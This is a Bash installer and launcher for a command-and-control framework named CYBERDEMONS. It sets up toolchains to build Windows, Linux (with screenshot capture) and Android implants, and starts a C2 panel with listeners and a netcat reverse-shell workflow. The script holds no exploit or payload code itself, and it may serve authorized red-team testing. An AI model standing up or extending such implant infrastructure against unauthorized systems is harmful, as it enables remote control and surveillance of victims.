#!/usr/bin/env bash
# CYBERDEMONS C2 Framework - Installer and launcher
# For authorized security testing and educational purposes only.
#
#   ./install.sh                 install everything, then start the panel
#   ./install.sh --no-run        install only, do not start the panel
#   ./install.sh --skip-android  skip the JDK + Android SDK (core panel only)
#   ./install.sh --help          full option list
#
# Only 'flask' is a hard dependency. 'cryptography' is an optional accelerator
# that the code falls back to a pure-Python implementation without.

set -euo pipefail

RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
MAGENTA='\033[0;35m'
NC='\033[0m'
BOLD='\033[1m'

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
JAVA_HOME="${CYB_JAVA_HOME:-/opt/jdk-17.0.2}"
ANDROID_HOME="${CYB_ANDROID_HOME:-/opt/android-sdk}"
BUILD_TOOLS="34.0.0"
PLATFORM="android-34"
JDK_URL="https://download.java.net/java/GA/jdk17.0.2/dfd4a8d0985749f896bed50d7138ee7f/8/GPL/openjdk-17.0.2_linux-x64_bin.tar.gz"
CMDLINE_TOOLS_URL="https://dl.google.com/android/repository/commandlinetools-linux-11076708_latest.zip"

RUN_PANEL=1
SKIP_ANDROID=0
WEB_HOST="${CYB_WEB_HOST:-0.0.0.0}"
WEB_PORT="${CYB_WEB_PORT:-5000}"

print_banner() {
    echo -e "${CYAN}"
    echo "  ██████╗██╗   ██╗██████╗ ███████╗██████╗ ██████╗ ███████╗███╗   ███╗ ██████╗ ███╗   ██╗███████╗"
    echo " ██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝████╗ ████║██╔═══██╗████╗  ██║██╔════╝"
    echo " ██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝██║  ██║█████╗  ██╔████╔██║██║   ██║██╔██╗ ██║███████╗"
    echo " ██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗██║  ██║██╔══╝  ██║╚██╔╝██║██║   ██║██║╚██╗██║╚════██║"
    echo " ╚██████╗   ██║   ██████╔╝███████╗██║  ██║██████╔╝███████╗██║ ╚═╝ ██║╚██████╔╝██║ ╚████║███████║"
    echo "  ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝"
    echo -e "${NC}"
    echo -e "${MAGENTA}  C2 FRAMEWORK v2.0 — Installer${NC}"
    echo ""
}

log_info()  { echo -e "${CYAN}[*]${NC} $1"; }
log_ok()    { echo -e "${GREEN}[+ ]${NC} $1"; }
log_warn()  { echo -e "${YELLOW}[! ]${NC} $1"; }
log_error() { echo -e "${RED}[- ]${NC} $1"; }
log_step()  { echo -e "\n${BOLD}${MAGENTA}==> $1${NC}"; }

usage() {
    cat <<'USAGE'
CYBERDEMONS C2 — installer

Usage: ./install.sh [options]

Options:
  --no-run            install only, do not start the panel
  --skip-android      skip the JDK and Android SDK (panel + implants only)
  --host <addr>       panel bind address        (default 0.0.0.0)
  --port <n>          panel web port            (default 5000)
  --no-venv           install python packages system-wide, ignore .venv
  -h, --help          this message

What gets installed:
  required   gcc, python3, flask, netcat, libx11-dev, libcrypt-dev
  optional   x86_64-w64-mingw32-g++   Windows payload (pay.cpp)
  optional   JDK 17 + Android SDK     APK builder (apk_builder/generate_apk.py)
  optional   cryptography             AEAD accelerator (pure-Python fallback exists)

Run the panel after install:
  python3 web_listener.py          # UI + CYB3 listeners
  ./cybtest/run_tests.sh           # 7-stage verification
USAGE
}

need_root() {
    if [ "$EUID" -ne 0 ]; then
        log_error "This step needs root: sudo $0 $*"
        exit 1
    fi
}

check_os() {
    if ! grep -qiE "kali|debian|ubuntu|parrot" /etc/os-release 2>/dev/null; then
        log_warn "Detected non-Debian system. Package names may differ."
    fi
    if [ -z "${VIRTUAL_ENV:-}" ]; then
        log_info "No virtualenv active — using system python3"
    fi
}

have() { command -v "$1" >/dev/null 2>&1; }

# Read a distribution version without importing the package. flask.__version__
# and cryptography.__version__ are both deprecated and emit a warning on import.
pkg_version() {
    "$PY" -c "import importlib.metadata as m,sys; print(m.version(sys.argv[1]))" "$1" 2>/dev/null \
        || echo "?"
}

# ============================================================
# 1. System packages
# ============================================================
install_system_packages() {
    log_step "Installing system packages"
    need_root install_system_packages

    export DEBIAN_FRONTEND=noninteractive
    apt-get update -qq

    log_info "Installing build essentials..."
    # netcat-openbsd provides the `nc -lvnp` form the /shells page tells you to use.
    # libx11-dev  -> pay_linux.c -lX11 (screenshot)
    # libcrypt-dev -> pay_linux.c -lcrypt
    if ! apt-get install -y -qq \
        curl wget unzip git ca-certificates \
        gcc g++ make binutils \
        python3 python3-pip python3-venv \
        netcat-openbsd \
        libx11-dev \
        libcrypt-dev \
        imagemagick; then
        log_error "apt-get install failed — see the apt output above"
        return 1
    fi

    log_ok "System packages installed"
}

# ============================================================
# 2. Python dependencies
# ============================================================
# 'flask' is the only hard requirement. 'cryptography' is preferred because it
# makes the ChaCha20-Poly1305 backend ~30x faster, but cybc2.py ships a
# pure-Python fallback and the test suite skips those stages without it.
install_python_deps() {
    log_step "Installing Python dependencies"

    if [ "$USE_VENV" = "1" ]; then
        if [ ! -d "$SCRIPT_DIR/.venv" ]; then
            log_info "Creating virtualenv at $SCRIPT_DIR/.venv"
            python3 -m venv "$SCRIPT_DIR/.venv"
        fi
        # shellcheck disable=SC1091
        . "$SCRIPT_DIR/.venv/bin/activate"
        PY="$SCRIPT_DIR/.venv/bin/python3"
        log_info "Using $($PY --version) from .venv"
    else
        PY="python3"
    fi

    if ! "$PY" -c "import flask" 2>/dev/null; then
        log_info "Installing flask..."
        if ! "$PY" -m pip install --quiet --upgrade pip; then
            log_warn "pip self-upgrade failed, continuing"
        fi
        if ! "$PY" -m pip install --quiet flask; then
            log_error "Could not install flask"
            return 1
        fi
    fi
    log_ok "flask $("$PY" -c 'import flask; print(flask.__version__)')"

    if "$PY" -c "import cryptography" 2>/dev/null; then
        log_ok "cryptography present (AEAD accelerated)"
    else
        log_info "Installing optional accelerator: cryptography"
        if "$PY" -m pip install --quiet cryptography 2>/dev/null ||
           have apt-get && [ "$EUID" -eq 0 ] &&
           apt-get install -y -qq python3-cryptography 2>/dev/null; then
            log_ok "cryptography installed"
        else
            log_warn "cryptography unavailable — using the pure-Python AEAD"
            log_warn "  (interop + backend-parity test stages will be skipped)"
        fi
    fi
}

# ============================================================
# 3. MinGW (Windows x64 cross-compilation)
# ============================================================
# Target: Windows x86-64 only.
#
# NOTE: 'x86_64-w64-mingw32-g++' is the *binary* name, not a package name.
# Passing it to apt aborts the whole transaction with "Unable to locate
# package" and installs nothing. Install the per-target packages instead.
#
# We deliberately do NOT install the 'mingw-w64' metapackage here: it depends
# on the i686 cross-toolchain too, which is dead weight for a win64-only build.
# 'posix' is preferred over 'win32' for C++ (full <thread>/<mutex>/std::future,
# proper C++11 threading semantics); the win32 variant is a threads subset.
install_mingw() {
    log_step "Installing MinGW-w64 (Windows x86-64 cross-compiler)"

    if have x86_64-w64-mingw32-g++; then
        log_ok "MinGW already present: $(x86_64-w64-mingw32-g++ --version | head -1)"
        return
    fi
    need_root install_mingw

    local mingw_pkgs=(
        g++-mingw-w64-x86-64-posix      # C++ compiler  -> x86_64-w64-mingw32-g++
        gcc-mingw-w64-x86-64-posix      # C compiler    -> x86_64-w64-mingw32-gcc
        binutils-mingw-w64-x86-64       # as/ld/strip  -> x86_64-w64-mingw32-*
        mingw-w64-x86-64-dev            # CRT headers/libs
        mingw-w64-common
    )

    if ! apt-get install -y -qq "${mingw_pkgs[@]}" 2>/dev/null; then
        log_warn "posix variant unavailable, falling back to win32 threads variant..."
        apt-get install -y -qq \
            g++-mingw-w64-x86-64-win32 \
            gcc-mingw-w64-x86-64-win32 \
            binutils-mingw-w64-x86-64 \
            mingw-w64-x86-64-dev \
            mingw-w64-common \
            2>/dev/null || log_warn "Install mingw-w64-x86-64 manually for Windows payload support"
    fi

    # Pin the alternative to the posix build so a later 'apt upgrade' that also
    # pulls in the win32 variant does not silently flip the default.
    if have x86_64-w64-mingw32-g++; then
        update-alternatives --set x86_64-w64-mingw32-g++ \
            /usr/bin/x86_64-w64-mingw32-g++-posix >/dev/null 2>&1 \
            || true
        log_ok "MinGW-w64 x86-64 installed"
    else
        log_warn "MinGW not found — Windows payload building unavailable"
    fi
}

# ============================================================
# 4. JDK 17
# ============================================================
install_jdk() {
    log_step "Installing JDK 17"

    if [ -x "$JAVA_HOME/bin/javac" ]; then
        log_ok "JDK 17 already installed at $JAVA_HOME"
        return
    fi
    # Reuse a distro JDK rather than downloading ~180MB for nothing.
    if have javac; then
        JAVA_HOME="$(dirname "$(dirname "$(readlink -f "$(command -v javac)")")")"
        log_ok "Using the system JDK: $JAVA_HOME ($("$JAVA_HOME/bin/javac" -version 2>&1))"
        return
    fi
    need_root install_jdk

    log_info "Downloading JDK 17..."
    local tmpfile
    tmpfile="$(mktemp /tmp/jdk17.XXXXXX.tar.gz)"
    if ! wget -q --show-progress -O "$tmpfile" "$JDK_URL"; then
        rm -f "$tmpfile"
        log_error "JDK download failed — install openjdk-17-jdk manually"
        return 1
    fi

    log_info "Extracting to /opt/..."
    mkdir -p /opt
    tar -xzf "$tmpfile" -C /opt/
    rm -f "$tmpfile"

    if [ -x "$JAVA_HOME/bin/javac" ]; then
        log_ok "JDK 17 installed at $JAVA_HOME"
    else
        log_error "JDK 17 installation failed"
        log_warn "Expected at: $JAVA_HOME"
    fi
}

# ============================================================
# 5. Android SDK
# ============================================================
install_android_sdk() {
    log_step "Installing Android SDK"

    if [ -d "$ANDROID_HOME/platforms/$PLATFORM" ] && [ -d "$ANDROID_HOME/build-tools/$BUILD_TOOLS" ]; then
        log_ok "Android SDK already installed with platform $PLATFORM and build-tools $BUILD_TOOLS"
        return
    fi
    need_root install_android_sdk

    mkdir -p "$ANDROID_HOME"

    # Download command-line tools
    if [ ! -d "$ANDROID_HOME/cmdline-tools/latest" ]; then
        log_info "Downloading Android command-line tools..."
        local tmpfile
        tmpfile="$(mktemp /tmp/cmdtools.XXXXXX.zip)"
        if ! wget -q --show-progress -O "$tmpfile" "$CMDLINE_TOOLS_URL"; then
            rm -f "$tmpfile"
            log_error "Command-line tools download failed"
            return 1
        fi

        log_info "Extracting..."
        mkdir -p "$ANDROID_HOME/cmdline-tools"
        unzip -q -o "$tmpfile" -d "$ANDROID_HOME/cmdline-tools/"
        mv "$ANDROID_HOME/cmdline-tools/cmdline-tools" "$ANDROID_HOME/cmdline-tools/latest" 2>/dev/null || true
        rm -f "$tmpfile"
    fi

    export JAVA_HOME="$JAVA_HOME"
    export ANDROID_HOME="$ANDROID_HOME"
    export PATH="$PATH:$JAVA_HOME/bin:$ANDROID_HOME/cmdline-tools/latest/bin"

    # Accept licenses
    log_info "Accepting SDK licenses..."
    yes | "$ANDROID_HOME/cmdline-tools/latest/bin/sdkmanager" --licenses --sdk_root="$ANDROID_HOME" >/dev/null 2>&1 || true

    # Install platform and build tools
    log_info "Installing platform $PLATFORM..."
    "$ANDROID_HOME/cmdline-tools/latest/bin/sdkmanager" --sdk_root="$ANDROID_HOME" "platforms;$PLATFORM" 2>/dev/null

    log_info "Installing build-tools $BUILD_TOOLS..."
    "$ANDROID_HOME/cmdline-tools/latest/bin/sdkmanager" --sdk_root="$ANDROID_HOME" "build-tools;$BUILD_TOOLS" 2>/dev/null

    if [ -d "$ANDROID_HOME/platforms/$PLATFORM" ] && [ -d "$ANDROID_HOME/build-tools/$BUILD_TOOLS" ]; then
        log_ok "Android SDK installed successfully"
    else
        log_error "Android SDK installation may have failed"
        log_warn "Platform: $ANDROID_HOME/platforms/$PLATFORM"
        log_warn "Build-tools: $ANDROID_HOME/build-tools/$BUILD_TOOLS"
    fi
}

# ============================================================
# 6. Environment variables
# ============================================================
setup_environment() {
    log_step "Setting up environment variables"

    local env_file="/etc/profile.d/cyberdemon.sh"
    cat > "$env_file" << ENVEOF
# CYBERDEMONS C2 Framework
export JAVA_HOME=$JAVA_HOME
export ANDROID_HOME=$ANDROID_HOME
export PATH=\$PATH:\$JAVA_HOME/bin:\$ANDROID_HOME/build-tools/$BUILD_TOOLS:\$ANDROID_HOME/cmdline-tools/latest/bin
ENVEOF
    chmod 644 "$env_file"

    # Also add to current shell
    export JAVA_HOME="$JAVA_HOME"
    export ANDROID_HOME="$ANDROID_HOME"
    export PATH="$PATH:$JAVA_HOME/bin:$ANDROID_HOME/build-tools/$BUILD_TOOLS:$ANDROID_HOME/cmdline-tools/latest/bin"

    log_ok "Environment variables set in $env_file"
    log_info "This shell only — run 'source $env_file' in a new terminal to pick them up"
}

# ============================================================
# 7. Runtime directories
# ============================================================
setup_dirs() {
    log_step "Preparing runtime directories"
    mkdir -p "$SCRIPT_DIR/data" \
             "$SCRIPT_DIR/build_output" \
             "$SCRIPT_DIR/clients" \
             "$SCRIPT_DIR/uploads" \
             "$SCRIPT_DIR/build_keys"
    chmod 700 "$SCRIPT_DIR/build_keys"   # signing keys live here
    log_ok "Runtime directories ready (build_keys is 0700)"
}

# ============================================================
# 8. Verify installation
# ============================================================
# NOTE: never use `((errors++))` in here. Under `set -e` a post-increment that
# evaluates to 0 returns exit status 1, which would abort the whole script on
# the first missing component — silently, before the summary ever printed.
# `errors=$((errors + 1))` is an assignment and always returns 0.
verify_installation() {
    log_step "Verifying installation"

    local errors=0
    local warn=0

    echo ""
    echo -e "${BOLD}Component Status:${NC}"
    echo "─────────────────────────────────────────"

    # Python
    if have python3; then
        echo -e "  ${GREEN}✓${NC} Python3       $(python3 --version 2>&1)"
    else
        echo -e "  ${RED}✗${NC} Python3       NOT FOUND"
        errors=$((errors + 1))
    fi

    # Flask — check the interpreter that will actually run the panel
    if "$PY" -c "import flask" 2>/dev/null; then
        echo -e "  ${GREEN}✓${NC} Flask         $(pkg_version flask)  [$PY]"
    else
        echo -e "  ${RED}✗${NC} Flask         NOT FOUND in $PY"
        errors=$((errors + 1))
    fi

    # Crypto backend
    if "$PY" -c "import cryptography" 2>/dev/null; then
        echo -e "  ${GREEN}✓${NC} Cryptography  $(pkg_version cryptography) (accelerated)"
    else
        echo -e "  ${YELLOW}!${NC} Cryptography  not installed — pure-Python AEAD fallback will be used"
        warn=$((warn + 1))
    fi

    # GCC
    if have gcc; then
        echo -e "  ${GREEN}✓${NC} GCC           $(gcc --version | head -1)"
    else
        echo -e "  ${RED}✗${NC} GCC           NOT FOUND"
        errors=$((errors + 1))
    fi

    # X11 + libcrypt headers, needed to link pay_linux.c
    local missing_libs=()
    printf '#include <X11/Xlib.h>\nint main(void){return 0;}\n' > /tmp/cyb_chk_x11.c
    gcc /tmp/cyb_chk_x11.c -lX11 -o /tmp/cyb_chk_x11 2>/dev/null || missing_libs+=("X11")
    if [ -e /usr/include/crypt.h ] || [ -e /usr/include/x86_64-linux-gnu/crypt.h ]; then
        :
    else
        missing_libs+=("crypt.h")
    fi
    rm -f /tmp/cyb_chk_x11.c /tmp/cyb_chk_x11
    if [ ${#missing_libs[@]} -eq 0 ]; then
        echo -e "  ${GREEN}✓${NC} X11 + libcrypt headers present (pay_linux.c links clean)"
    else
        echo -e "  ${YELLOW}!${NC} Missing headers: ${missing_libs[*]} — install libx11-dev libcrypt-dev"
        warn=$((warn + 1))
    fi

    # MinGW
    if have x86_64-w64-mingw32-g++; then
        echo -e "  ${GREEN}✓${NC} MinGW-w64     $(x86_64-w64-mingw32-g++ --version 2>&1 | head -1)"
    else
        echo -e "  ${YELLOW}!${NC} MinGW-w64     not installed (Windows payloads unavailable)"
        warn=$((warn + 1))
    fi

    # Netcat
    if have nc; then
        echo -e "  ${GREEN}✓${NC} Netcat        $(nc -h 2>&1 | head -1)"
    else
        echo -e "  ${YELLOW}!${NC} Netcat        not installed (listener unavailable)"
        warn=$((warn + 1))
    fi

    # JDK + Android SDK
    if [ "$SKIP_ANDROID" = "1" ]; then
        echo -e "  ${YELLOW}-${NC} JDK / SDK     skipped (--skip-android)"
    else
        if [ -x "$JAVA_HOME/bin/javac" ]; then
            echo -e "  ${GREEN}✓${NC} JDK 17        $JAVA_HOME"
        else
            echo -e "  ${RED}✗${NC} JDK 17        NOT FOUND at $JAVA_HOME"
            errors=$((errors + 1))
        fi

        if [ -d "$ANDROID_HOME/platforms/$PLATFORM" ]; then
            echo -e "  ${GREEN}✓${NC} Android SDK   platform $PLATFORM"
        else
            echo -e "  ${RED}✗${NC} Android SDK   platform $PLATFORM NOT FOUND"
            errors=$((errors + 1))
        fi

        if [ -d "$ANDROID_HOME/build-tools/$BUILD_TOOLS" ]; then
            echo -e "  ${GREEN}✓${NC} Build Tools   $BUILD_TOOLS"
        else
            echo -e "  ${RED}✗${NC} Build Tools   $BUILD_TOOLS NOT FOUND"
            errors=$((errors + 1))
        fi
    fi

    # APK builder script
    if [ -f "$SCRIPT_DIR/apk_builder/generate_apk.py" ]; then
        echo -e "  ${GREEN}✓${NC} APK Builder   apk_builder/generate_apk.py"
    else
        echo -e "  ${RED}✗${NC} APK Builder   NOT FOUND"
        errors=$((errors + 1))
    fi

    # Panel + implants
    local missing_src=()
    for f in web_listener.py cybc2.py cybai.py cybproto.h cybcrypt.h cybbuf.h \
             pay.cpp pay_linux.c; do
        [ -f "$SCRIPT_DIR/$f" ] || missing_src+=("$f")
    done
    if [ ${#missing_src[@]} -eq 0 ]; then
        echo -e "  ${GREEN}✓${NC} Sources        panel, crypto, protocol, both implants"
    else
        echo -e "  ${RED}✗${NC} Sources        MISSING: ${missing_src[*]}"
        echo -e "     Run this script from the project root, not from a copy of it."
        errors=$((errors + 1))
    fi

    # Templates — Flask render_template() resolves from ./templates
    if [ -f "$SCRIPT_DIR/templates/index.html" ] && [ -d "$SCRIPT_DIR/templates" ]; then
        echo -e "  ${GREEN}✓${NC} Templates      $(find "$SCRIPT_DIR/templates" -name '*.html' | wc -l) page(s)"
    else
        echo -e "  ${RED}✗${NC} Templates      MISSING — the UI will 500 on every page"
        errors=$((errors + 1))
    fi

    # Syntax check the Python that has to import cleanly at startup
    if "$PY" -m py_compile "$SCRIPT_DIR/web_listener.py" "$SCRIPT_DIR/cybc2.py" \
                          "$SCRIPT_DIR/cybai.py" 2>/dev/null; then
        echo -e "  ${GREEN}✓${NC} Python syntax  web_listener.py, cybc2.py, cybai.py"
    else
        echo -e "  ${RED}✗${NC} Python syntax  a core module does not compile"
        errors=$((errors + 1))
    fi

    echo "─────────────────────────────────────────"
    echo ""

    if [ "$errors" -eq 0 ]; then
        if [ "$warn" -eq 0 ]; then
            echo -e "${GREEN}${BOLD}All components installed successfully.${NC}"
        else
            echo -e "${GREEN}${BOLD}Core install complete${NC} ${YELLOW}($warn optional item(s) missing)${NC}"
        fi
    else
        echo -e "${RED}${BOLD}$errors required component(s) missing — the panel will not start.${NC}"
        return 1
    fi
    echo ""
}

# ============================================================
# 9. Run
# ============================================================
run_panel() {
    log_step "Starting the panel"

    if [ ! -f "$SCRIPT_DIR/web_listener.py" ]; then
        log_error "web_listener.py not found in $SCRIPT_DIR"
        return 1
    fi

    if have ss && ss -ltn 2>/dev/null | grep -q ":$WEB_PORT "; then
        log_warn "Port $WEB_PORT is already in use — pick another with --port"
    fi

    cat << RUNEOF

  ${CYAN}Panel:${NC}      http://127.0.0.1:$WEB_PORT
  ${CYAN}Bind:${NC}       $WEB_HOST:$WEB_PORT
  ${CYAN}Listener:${NC}   ports from data/listeners.json
  ${CYAN}Stop:${NC}       Ctrl-C

  ${CYAN}First run does this automatically:${NC}
    - generates data/psk.json if missing, then writes that PSK into pay.cpp,
      pay_linux.c and any existing APK sources
    - starts a CYB3 listener on every enabled port in data/listeners.json
    ${YELLOW}- the PSK and the implants are baked at build time, so rebuild a
      payload if you rotate the key from the /builder page${NC}

RUNEOF

    cd "$SCRIPT_DIR"
    export CYB_WEB_HOST="$WEB_HOST"
    export CYB_WEB_PORT="$WEB_PORT"
    export PYTHONUNBUFFERED=1
    exec "$PY" web_listener.py
}

# ============================================================
# Main
# ============================================================
main() {
    USE_VENV=1
    [ "${CYB_NO_VENV:-0}" = "1" ] && USE_VENV=0

    while [ $# -gt 0 ]; do
        case "$1" in
            --no-run)       RUN_PANEL=0 ;;
            --skip-android) SKIP_ANDROID=1 ;;
            --no-venv)      USE_VENV=0 ;;
            --host)         WEB_HOST="${2:?--host needs a value}"; shift ;;
            --port)         WEB_PORT="${2:?--port needs a value}"; shift ;;
            -h|--help)      print_banner; usage; exit 0 ;;
            *)              log_error "Unknown option: $1"; echo ""; usage; exit 2 ;;
        esac
        shift
    done

    print_banner
    check_os

    install_system_packages
    install_python_deps
    setup_dirs
    install_mingw
    if [ "$SKIP_ANDROID" = "1" ]; then
        log_step "Skipping JDK + Android SDK (--skip-android)"
        log_info "The /android APK builder will report the toolchain as missing"
    else
        install_jdk
        install_android_sdk
        setup_environment
    fi

    verify_installation

    if [ "$RUN_PANEL" = "1" ]; then
        run_panel
    else
        cat << 'DONEEOF'

  Start the panel:        python3 web_listener.py
  Run the test suite:     ./cybtest/run_tests.sh
  Rebuild after PSK rotation (writes the new key into the sources):
                          python3 web_listener.py   # on next start, or
                          python3 -c "import web_listener as w; w.sync_psk_into_sources()"

DONEEOF
    fi
}

main "$@"
